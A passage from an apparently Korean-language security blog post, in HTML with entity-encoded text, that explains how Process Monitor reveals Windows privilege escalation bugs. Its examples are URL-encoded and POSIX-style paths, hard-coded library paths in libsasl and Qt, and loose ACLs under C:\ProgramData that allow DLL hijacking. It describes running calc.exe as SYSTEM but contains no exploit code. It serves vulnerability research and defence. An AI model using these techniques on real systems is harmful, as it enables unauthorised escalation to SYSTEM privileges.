href="#URL-&#xC778;&#xCF54;&#xB529;-&#xACBD;&#xB85C;" class="headerlink" title="URL &#xC778;&#xCF54;&#xB529; &#xACBD;&#xB85C;"></a>URL &#xC778;&#xCF54;&#xB529; &#xACBD;&#xB85C;</h3><p>&#xC704;&#xC758; &#xC2A4;&#xD06C;&#xB9B0;&#xC0F7;&#xC5D0;&#xC11C; &#xC54C; &#xC218; &#xC788;&#xB4EF;&#xC774; VMware Tools &#xD504;&#xB85C;&#xC138;&#xC2A4; <code>VGAuthService.exe</code>&#xB294; <code>C:\Program%20Files\VMware\VMware%20Tools\VMware%20VGAuth\schemas\xmldsig-core-schema.xsd</code> &#xACBD;&#xB85C;&#xC5D0; &#xC561;&#xC138;&#xC2A4;&#xB97C; &#xC2DC;&#xB3C4;&#xD55C;&#xB2E4;. &#xACF5;&#xBC31;&#xC774; &#xD3EC;&#xD568;&#xB41C; &#xACBD;&#xB85C;&#xAC00; URL&#xB85C; &#xC778;&#xCF54;&#xB529;&#xB41C; &#xACBD;&#xC6B0; &#xD574;&#xB2F9; &#xACF5;&#xBC31;&#xC774; <code>%20</code>&#xC73C;&#xB85C; &#xB300;&#xCCB4;&#xB41C; &#xAC83;&#xC774;&#xB2E4;.</p><p>&#xC774;&#xB7EC;&#xD55C; &#xACB0;&#xACFC;&#xB294; &#xC694;&#xCCAD;&#xB41C; &#xACBD;&#xB85C;&#xAC00; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xC801;&#xC808;&#xD55C; ACL&#xC774; &#xC788;&#xB294; <code>C:\Program Files\</code>&#xC758; &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xAC00; &#xC544;&#xB2C8;&#xB77C; &#xB8E8;&#xD2B8; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB97C; &#xBCF4;&#xAE30; &#xC2DC;&#xC791;&#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC774;&#xB2E4;. Windows &#xC2DC;&#xC2A4;&#xD15C;&#xC740; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xB3C4; &#xC2DC;&#xC2A4;&#xD15C; &#xB8E8;&#xD2B8; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0;&#xC11C; &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB97C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xC774;&#xAC83;&#xC740; &#xBC18;&#xBCF5;&#xD574;&#xC11C; &#xB098;&#xC624;&#xB294; &#xC8FC;&#xC694; &#xAC1C;&#xB150;&#xC774; &#xB420; &#xAC83;&#xC774;&#xBBC0;&#xB85C; &#xC774;&#xAC83;&#xC744; &#xAE30;&#xC5B5;&#xD558;&#xC790;.</p><p>&#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xBA85;&#xB839; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xC5D0;&#xC11C; &#xBB34;&#xC5C7;&#xC744; &#xD560; &#xC218; &#xC788;&#xB294;&#xC9C0; &#xBCF4;&#xC790;:</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%202.png" alt="Untitled"></p><blockquote><p>&#xB8E8;&#xD2B8; &#xB514;&#xB809;&#xD1A0;&#xB9AC; <code>C:\</code> &#xC5D0;&#xC11C; &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>C:\</code> &#xC5D0;&#xC11C; <code>Program%20Files</code> &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB3C4; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p></blockquote><p>&#xD30C;&#xC77C; &#xC561;&#xC138;&#xC2A4;&#xB97C; &#xC120;&#xD0DD;&#xD558;&#xACE0; Ctrl-K&#xB97C; &#xB20C;&#xB7EC; &#xCF5C;&#xC2A4;&#xD0DD;&#xC744; &#xAC00;&#xC838;&#xC634;&#xC73C;&#xB85C;&#xC368; Process Explorer&#xC5D0;&#xC11C; &#xC870;&#xAE08; &#xB354; &#xAE4A;&#xC774; &#xD30C;&#xACE0;&#xB4E4; &#xC218; &#xC788;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%203.png" alt="Untitled"></p><p>&#xD30C;&#xC77C; &#xC561;&#xC138;&#xC2A4;&#xAC00; <code>VGAuthService.exe + 0x110d9</code>&#xC5D0; &#xC758;&#xD574; &#xD2B8;&#xB9AC;&#xAC70;&#xB418;&#xACE0; &#xADF8; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <code>xmlLoadExternalEntity()</code>&#xC5D0; &#xB300;&#xD55C; &#xD638;&#xCD9C;&#xC774; &#xC788;&#xC74C;&#xC744; &#xC54C; &#xC218; &#xC788;&#xB2E4;.</p><p>&#xACBD;&#xB85C;&#xAC00; URL&#xB85C; &#xC778;&#xCF54;&#xB529;&#xB418;&#xC5B4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;  &#xAD8C;&#xD55C; &#xC788;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xACBD;&#xB85C;&#xC758; &#xD30C;&#xC77C;&#xC744; &#xB85C;&#xB4DC;&#xD558;&#xB824;&#xACE0; &#xC2DC;&#xB3C4;&#xD558;&#xAC8C; &#xB41C;&#xB2E4;. &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC774; &#xACBD;&#xB85C;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xAD8C;&#xD55C;&#xC774; &#xC788;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xC904; &#xC218; &#xC788;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB41C;&#xB2E4;. &#xC774; &#xACBD;&#xC6B0; &#xACB0;&#xACFC;&#xB294; XXE(XML External Entity) &#xCDE8;&#xC57D;&#xC810;&#xBFD0;&#xC774;&#xC9C0;&#xB9CC; &#xC774;&#xB294; &#xB2E8;&#xC9C0; &#xC6CC;&#xBC0D;&#xC5C5;&#xC5D0; &#xBD88;&#xACFC;&#xD558;&#xB2E4;.</p><h3 id="POSIX-&#xACBD;&#xB85C;"><a href="#POSIX-&#xACBD;&#xB85C;" class="headerlink" title="POSIX &#xACBD;&#xB85C;"></a>POSIX &#xACBD;&#xB85C;</h3><p>&#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; Windows &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; POSIX &#xC2A4;&#xD0C0;&#xC77C; &#xACBD;&#xB85C;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xACBD;&#xC6B0; &#xC774; &#xACBD;&#xB85C;&#xB294; Windows &#xC2A4;&#xD0C0;&#xC77C; &#xACBD;&#xB85C;&#xB85C; &#xC815;&#xADDC;&#xD654;&#xB41C;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, Windows &#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; <code>/usr/local/</code> &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xC561;&#xC138;&#xC2A4;&#xD558;&#xB824;&#xACE0; &#xD558;&#xBA74; &#xACBD;&#xB85C;&#xB294; <code>C:\usr\local\</code>&#xB85C; &#xD574;&#xC11D;&#xB418;&#xBA70; &#xC704;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD55C; &#xAC83;&#xACFC; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; Windows&#xC5D0;&#xC11C; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xB294; &#xACBD;&#xB85C;&#xC774;&#xB2E4;.</p><p>&#xB2E4;&#xC74C;&#xC740; &#xD328;&#xCE58;&#xB41C; &#xBCF4;&#xC548; &#xC81C;&#xD488;&#xC774; &#xC124;&#xCE58;&#xB41C; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBAA8;&#xB2C8;&#xD130; &#xB85C;&#xADF8;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%204.png" alt="Untitled"></p><p><code>openssl.cnf</code>&#xB97C; &#xD1B5;&#xD574; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xAE30; &#xC704;&#xD574; &#xACF5;&#xAC1C;&#xC801;&#xC73C;&#xB85C; &#xC54C;&#xB824;&#xC9C4; &#xAE30;&#xC220;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC81C;&#xD55C;&#xB41C; &#xC0AC;&#xC6A9;&#xC790; &#xACC4;&#xC815;&#xC5D0;&#xC11C; SYSTEM &#xAD8C;&#xD55C;&#xC73C;&#xB85C; <code>calc.exe</code>&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xC5EC; code execution&#xC744; &#xC2DC;&#xC5F0;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%205.png" alt="Untitled"></p><h3 id="&#xC608;&#xC0C1;&#xCE58;-&#xBABB;&#xD55C;-&#xACBD;&#xB85C;&#xC5D0;&#xC11C;-&#xB85C;&#xB4DC;&#xB418;&#xB294;-&#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;-&#xC0AC;&#xC6A9;"><a href="#&#xC608;&#xC0C1;&#xCE58;-&#xBABB;&#xD55C;-&#xACBD;&#xB85C;&#xC5D0;&#xC11C;-&#xB85C;&#xB4DC;&#xB418;&#xB294;-&#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;-&#xC0AC;&#xC6A9;" class="headerlink" title="&#xC608;&#xC0C1;&#xCE58; &#xBABB;&#xD55C; &#xACBD;&#xB85C;&#xC5D0;&#xC11C; &#xB85C;&#xB4DC;&#xB418;&#xB294; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xC0AC;&#xC6A9;"></a>&#xC608;&#xC0C1;&#xCE58; &#xBABB;&#xD55C; &#xACBD;&#xB85C;&#xC5D0;&#xC11C; &#xB85C;&#xB4DC;&#xB418;&#xB294; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xC0AC;&#xC6A9;</h3><p>&#xACBD;&#xC6B0;&#xC5D0; &#xB530;&#xB77C; &#xAC1C;&#xBC1C;&#xC790;&#xAC00; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; Windows &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xB294; &#xC704;&#xCE58;&#xC5D0;&#xC11C; &#xB85C;&#xB4DC;&#xB41C; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xB3C4; &#xC788;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xB2E4;&#xC74C;&#xC740; <code>C:\CMU\bin\sasl2</code> &#xACBD;&#xB85C;&#xC5D0; &#xC561;&#xC138;&#xC2A4;&#xB97C; &#xC2DC;&#xB3C4;&#xD558;&#xB294; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBAA8;&#xB2C8;&#xD130; &#xB85C;&#xADF8;&#xC774;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%206.png" alt="Untitled"></p><p>&#xCF5C;&#xC2A4;&#xD0DD;&#xC744; &#xBCF4;&#xBA74; &#xC774; &#xC561;&#xC138;&#xC2A4;&#xAC00; <code>libsasl.dll</code> &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC5D0; &#xC758;&#xD574; &#xD2B8;&#xB9AC;&#xAC70;&#xB418;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%207.png" alt="Untitled"></p><p><code>libsasl.dll</code>&#xC5D0; &#xB300;&#xD55C; &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xBA74; <strong>[C:\CMU\bin\sasl2</strong> &#xACBD;&#xB85C;&#xC5D0; &#xB300;&#xD55C; &#xD558;&#xB4DC; &#xCF54;&#xB529;&#xB41C; &#xCC38;&#xC870;&#xB97C;](<a href="https://github.com/cyrusimap/cyrus-sasl/blob/eeb935a9198172aede242c77b0e0dafe9312db10/win32/include/config.h#L117">https://github.com/cyrusimap/cyrus-sasl/blob/eeb935a9198172aede242c77b0e0dafe9312db10/win32/include/config.h#L117</a>)  &#xBCFC; &#xC218; &#xC788;&#xB2E4;.</p><p>&#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xB294; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB97C; &#xB9CC;&#xB4E4;&#xACE0; &#xAC70;&#xAE30;&#xC5D0; &#xC6D0;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xBC30;&#xCE58;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xBAA8;&#xB4E0; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790; &#xACC4;&#xC815;&#xC5D0;&#xC11C; SYSTEM &#xAD8C;&#xD55C;&#xC73C;&#xB85C; <code>calc.exe</code>&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%208.png" alt="Untitled"></p><h3 id="&#xAC1C;&#xBC1C;&#xC790;-&#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xB9CC;-&#xC874;&#xC7AC;&#xD558;&#xB294;-&#xACBD;&#xB85C;-&#xC0AC;&#xC6A9;"><a href="#&#xAC1C;&#xBC1C;&#xC790;-&#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xB9CC;-&#xC874;&#xC7AC;&#xD558;&#xB294;-&#xACBD;&#xB85C;-&#xC0AC;&#xC6A9;" class="headerlink" title="&#xAC1C;&#xBC1C;&#xC790; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xB9CC; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xACBD;&#xB85C; &#xC0AC;&#xC6A9;"></a>&#xAC1C;&#xBC1C;&#xC790; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xB9CC; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xACBD;&#xB85C; &#xC0AC;&#xC6A9;</h3><p>&#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xAC1C;&#xBC1C;&#xC790;&#xC758; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xB9CC; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xACBD;&#xB85C;&#xC5D0; &#xB300;&#xD55C; &#xCC38;&#xC870;&#xB97C; &#xD3EC;&#xD568;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xD574;&#xB2F9; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xAC00; &#xC5C6;&#xB294; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xAC00; &#xC81C;&#xB300;&#xB85C; &#xC791;&#xB3D9;&#xD558;&#xACE0; &#xB204;&#xAD70;&#xAC00;&#xAC00; &#xCC3E;&#xC9C0; &#xC54A;&#xB294; &#xD55C; &#xC774; &#xC18D;&#xC131;&#xC740; &#xBC1C;&#xACAC;&#xB418;&#xC9C0; &#xC54A;&#xC744; &#xC218; &#xC788;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, &#xC774; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB294; <code>C:\Qt\</code> &#xB514;&#xB809;&#xD1A0;&#xB9AC; &#xC5D0;&#xC11C; <code>plugins</code> &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB97C; &#xCC3E;&#xB294;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%209.png" alt="Untitled"></p><p>&#xBA87; &#xAC00;&#xC9C0; &#xB2E8;&#xACC4;&#xB97C; &#xAC74;&#xB108;&#xB6F8; &#xAC83;&#xC774;&#xC9C0;&#xB9CC; &#xC801;&#xC808;&#xD55C; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xBC30;&#xCE58;&#xD574; code execution&#xC744; &#xB2EC;&#xC131;&#xD560; &#xC218; &#xC788;&#xC74C;&#xC744; &#xC54C; &#xC218; &#xC788;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%2010.png" alt="Untitled"></p><p>Qt &#xAC1C;&#xBC1C; &#xD50C;&#xB7AB;&#xD3FC;&#xC744; &#xC790;&#xC138;&#xD788; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; &#xC774;&#xB7EC;&#xD55C; &#xC720;&#xD615;&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC798; &#xC54C;&#xB824;&#xC9C4; &#xBB38;&#xC81C;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; 5&#xB144; &#xC804;&#xC5D0; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC9C0;&#xB9CC; CVE&#xB97C; &#xBC1B;&#xC9C0; &#xBABB;&#xD588;&#xC73C;&#xBA70; &#xD574;&#xB2F9; &#xD328;&#xCE58;&#xAC00; &#xB3C4;&#xC785;&#xB418;&#xAE30; &#xC774;&#xC804;&#xC758; Qt &#xBC84;&#xC804;&#xC73C;&#xB85C; &#xAD6C;&#xCD95;&#xB418;&#xC5C8;&#xAC70;&#xB098; &#xAC1C;&#xBC1C;&#xC790;&#xAC00; <code>Qt5core.dll</code>&#xC5D0; &#xC800;&#xC7A5;&#xB41C; <code>qt_prfxpath</code> &#xAC12;&#xC744; &#xD328;&#xCE58;&#xD558;&#xAE30; &#xC704;&#xD574; <code>windeployqt</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xACBD;&#xC6B0; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xAC00; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC5D0; &#xCDE8;&#xC57D;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><h2 id="&#xC0AC;&#xC6A9;-&#xC911;&#xC778;-&#xACBD;&#xB85C;&#xC5D0;-&#xC608;&#xAE30;&#xCE58;-&#xC54A;&#xC740;-ACL&#xC774;-&#xC801;&#xC6A9;&#xB428;"><a href="#&#xC0AC;&#xC6A9;-&#xC911;&#xC778;-&#xACBD;&#xB85C;&#xC5D0;-&#xC608;&#xAE30;&#xCE58;-&#xC54A;&#xC740;-ACL&#xC774;-&#xC801;&#xC6A9;&#xB428;" class="headerlink" title="&#xC0AC;&#xC6A9; &#xC911;&#xC778; &#xACBD;&#xB85C;&#xC5D0; &#xC608;&#xAE30;&#xCE58; &#xC54A;&#xC740; ACL&#xC774; &#xC801;&#xC6A9;&#xB428;"></a>&#xC0AC;&#xC6A9; &#xC911;&#xC778; &#xACBD;&#xB85C;&#xC5D0; &#xC608;&#xAE30;&#xCE58; &#xC54A;&#xC740; ACL&#xC774; &#xC801;&#xC6A9;&#xB428;</h2><p>&#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; &#xC608;&#xAE30;&#xCE58; &#xC54A;&#xC740; &#xACBD;&#xB85C;&#xC5D0; &#xC561;&#xC138;&#xC2A4;&#xD558;&#xB294; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xACBD;&#xC6B0;&#xB294; &#xC0AC;&#xC2E4; &#xB2E8;&#xC21C;&#xD55C; &#xACF3;&#xC5D0; &#xC6D0;&#xC778;&#xC774; &#xC788;&#xB2E4;. &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xB294; Windows &#xC2DC;&#xC2A4;&#xD15C; &#xB8E8;&#xD2B8; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0;&#xC11C; &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB97C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xB2E4;. ACL&#xC744; &#xC801;&#xC808;&#xD558;&#xAC8C; &#xC124;&#xC815;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xB294; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB97C; &#xCC3E;&#xC73C;&#xB824;&#xBA74; &#xC870;&#xAE08; &#xB354; &#xC870;&#xC0AC;&#xD574;&#xC57C; &#xD55C;&#xB2E4;.</p><p>Windows &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC640; &#xAD00;&#xB828;&#xB41C; &#xB300;&#xBD80;&#xBD84;&#xC758; ACL &#xBB38;&#xC81C;&#xB294; &#xD55C; &#xAC00;&#xC9C0; &#xAC1C;&#xB150;&#xACFC; &#xAD00;&#xB828;&#xC774; &#xC788;&#xB2E4;.<br><code>C:\Program Files\</code> &#xB610;&#xB294; <code>C:\Program Files (x86)\</code>&#xC758; &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB294; &#xC0C1;&#xC18D;&#xC744; &#xD1B5;&#xD574; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xBCF4;&#xC548; ACL&#xC744; &#xAC16;&#xB294;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB97C; <code>C:\Program Files\WD\</code>&#xC5D0; &#xC124;&#xCE58;&#xD558;&#xB294; &#xACBD;&#xC6B0;, &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xB294; <code>C:\Program Files\</code>&#xC758; &#xC0C1;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC4F8; &#xC218; &#xC5C6;&#xACE0; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; <code>WD</code> &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xAC00; &#xC0C1;&#xC704; &#xAD8C;&#xD55C;&#xC744; &#xC0C1;&#xC18D;&#xD558;&#xBBC0;&#xB85C; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xB294; <code>WD</code> &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xC218;&#xC815;&#xD560; &#xC218; &#xC5C6;&#xB2E4;.</p><h3 id="ACL&#xC744;-&#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C;-&#xC124;&#xC815;&#xD558;&#xC9C0;-&#xC54A;&#xACE0;-C-ProgramData-&#xB514;&#xB809;&#xD1A0;&#xB9AC;-&#xC0AC;&#xC6A9;"><a href="#ACL&#xC744;-&#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C;-&#xC124;&#xC815;&#xD558;&#xC9C0;-&#xC54A;&#xACE0;-C-ProgramData-&#xB514;&#xB809;&#xD1A0;&#xB9AC;-&#xC0AC;&#xC6A9;" class="headerlink" title="ACL&#xC744; &#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD558;&#xC9C0; &#xC54A;&#xACE0; C:\ProgramData\ &#xB514;&#xB809;&#xD1A0;&#xB9AC; &#xC0AC;&#xC6A9;"></a>ACL&#xC744; &#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD558;&#xC9C0; &#xC54A;&#xACE0; C:\ProgramData\ &#xB514;&#xB809;&#xD1A0;&#xB9AC; &#xC0AC;&#xC6A9;</h3><p><code>ProgramData</code> &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB294; &#xC758;&#xB3C4;&#xC801;&#xC73C;&#xB85C; &#xC0C1;&#xC2B9;&#xB41C; &#xAD8C;&#xD55C; &#xC5C6;&#xC774; &#xC4F8; &#xC218; &#xC788;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>ProgramData</code> &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xC0DD;&#xC131;&#xB41C; &#xBAA8;&#xB4E0; &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC4F8; &#xC218; &#xC788;&#xB2E4;. &#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; <code>ProgramData</code> &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC5D0; &#xB530;&#xB77C; &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xB300;&#xD55C; ACL&#xC774; &#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xACBD;&#xC6B0; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xAC00;&#xB2A5;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p>&#xB2E4;&#xC74C;&#xC740; <code>C:\ProgramData\</code> &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xBA70; &#xC608;&#xC57D;&#xB41C; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xAC00; &#xC788;&#xB294; &#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%2011.png" alt="Untitled"></p><p>&#xC774;&#xAC83;&#xC740; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC758; &#xB290;&#xC2A8;&#xD55C; ACL&#xB85C; &#xC778;&#xD574; &#xAC00;&#xB2A5;&#xD55C; DLL hijacking&#xC758; &#xC9C1;&#xC811;&#xC801;&#xC778; &#xC0AC;&#xB840;&#xC774;&#xB2E4;. </p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%2012.png" alt="Untitled"></p><p>&#xC774;&#xC81C; &#xC9C1;&#xC811; &#xC81C;&#xC791;&#xD55C; <code>calc.exe</code>&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; <code>msi.dll</code>&#xC744; &#xBC30;&#xCE58;&#xD558;&#xBA74; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; SYSTEM &#xAD8C;&#xD55C;&#xC758; <code>calc.exe</code> &#xAC00; &#xC2E4;&#xD589;&#xB41C;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xBB38;&#xC81C;&#xB294; &#xB9CC;&#xC5F0;&#xD558;&#xBA70; &#xC545;&#xC6A9;&#xD558;&#xAE30;&#xAC00; &#xC27D;&#xB2E4;.</p><p>DLL hijacking&#xC774; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xC704;&#xD55C; &#xC720;&#xC77C;&#xD55C; &#xC635;&#xC158;&#xC774; &#xC544;&#xB2C8;&#xB77C;&#xB294; &#xC810;&#xC740; &#xC8FC;&#xBAA9;&#xD560; &#xB9CC; &#xD558;&#xB2E4;. &#xAD8C;&#xD55C; &#xC788;&#xB294; 